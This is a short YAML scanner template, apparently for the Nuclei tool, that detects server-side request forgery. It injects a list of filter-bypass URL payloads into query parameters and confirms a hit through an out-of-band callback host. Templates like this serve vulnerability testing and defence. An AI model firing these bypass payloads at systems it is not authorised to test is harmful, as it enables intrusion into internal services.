id: ssrf

info:
  name: SSRF
  author: Maximus Decimus
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      ssrf:
        - "{{interactsh-url}}"
        - "https://{{interactsh-url}}"
        - "https://{{interactsh-url}}/%2F"
        - "https://{{interactsh-url}}////"
        - "https://{{interactsh-url}}%3F.{{Host}}/"
        - "https://{{interactsh-url}}%2523.{{Host}}/"
        - "https://bing?c=.{{Host}}/"
        - "https://%2F/{{interactsh-url}}"
        - "https:////{{interactsh-url}}"
        - "https:/%0D/{{interactsh-url}}"
        - "https:/%2F/{{interactsh-url}}"
        - "https:/%5C{{interactsh-url}}"
        - "https://{{interactsh-url}}"
        - "https://{{Host}}@{{interactsh-url}}"
        - "https:\\/{{interactsh-url}}"
        - "https:\\/\\/{{interactsh-url}}"
        - "https:\\\\{{interactsh-url}}"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
        - "{{ssrf}}"

    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the HTTP Interaction
        words:
          - "http"
